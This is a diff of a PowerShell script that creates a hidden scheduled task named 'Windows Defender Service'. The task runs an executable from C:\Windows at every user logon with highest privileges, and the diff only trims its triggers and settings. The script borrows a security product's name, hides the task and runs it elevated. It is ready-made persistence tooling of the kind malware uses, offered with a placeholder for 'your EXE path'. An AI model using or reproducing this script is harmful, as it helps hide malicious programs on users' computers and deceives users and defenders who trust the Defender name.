@@ -1,16 +1,14 @@
-$TaskName = "Windows Defender Service"  # Changed task name
+$TaskName = "Windows Defender Service" # Changed task name
 $ExePath = "C:\Windows\Windows Defender Service.exe" # Replace with your EXE path
 
 $Action = New-ScheduledTaskAction -Execute $ExePath
 
-# Trigger at log on of any user AND after being idle for 1 minute
+# Trigger at log on of any user
 $LogonTrigger = New-ScheduledTaskTrigger -AtLogOn
-$IdleTrigger = New-ScheduledTaskTrigger -Idle -IdleTime 1
 
-# Combine the triggers
-$Trigger = $LogonTrigger, $IdleTrigger
+$Trigger = $LogonTrigger
 
-$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowDemandStart -AllowHardTerminate -WakeToRun
+$Settings = New-ScheduledTaskSettingsSet -Hidden -WakeToRun
 
 # Use the current user's credentials
 $Principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -RunLevel Highest
@@ -29,7 +27,7 @@ $Task.Settings.Hidden = $true
 
 # Stop if the computer ceases to be idle
 $Task.Settings.StopIfGoingOnBatteries = $false
-$Task.Settings.StopIfIdleEnd = $true
+#$Task.Settings.StopIfIdleEnd = $true # removed because of idle trigger removal.
 
 # Update the task using the -InputObject parameter
 Set-ScheduledTask -InputObject $Task
